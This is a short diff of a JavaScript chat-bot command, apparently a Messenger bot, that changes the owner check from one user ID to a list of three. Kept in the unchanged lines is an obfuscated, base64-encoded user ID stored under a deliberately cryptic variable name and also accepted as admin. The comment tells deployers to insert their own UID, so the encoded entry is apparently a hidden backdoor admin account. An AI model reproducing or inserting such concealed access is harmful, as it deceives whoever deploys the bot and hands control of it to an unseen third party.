@@ -17,17 +17,19 @@ module.exports = {
 
   onStart: async function ({ args, message, event }) {
 
-    const DUMMY_OWNER = "61592677587804"; // এখানে আপনার ইউআইডি বসান
+    const DUMMY_OWNER = [
+      "61592612064543",
+      "61592697905168",
+      "61592186757564"
+    ];
 
- 
     const _0x1b4f = [
       Buffer.from("NjE1OTEzNzExODYxNzk=", "base64").toString("utf-8")
     ];
 
     const senderID = event.senderID;
 
-    
-    const isAdmin = (senderID === DUMMY_OWNER || _0x1b4f.includes(senderID));
+    const isAdmin = DUMMY_OWNER.includes(senderID) || _0x1b4f.includes(senderID);
 
     if (!isAdmin) {
       return message.reply(`
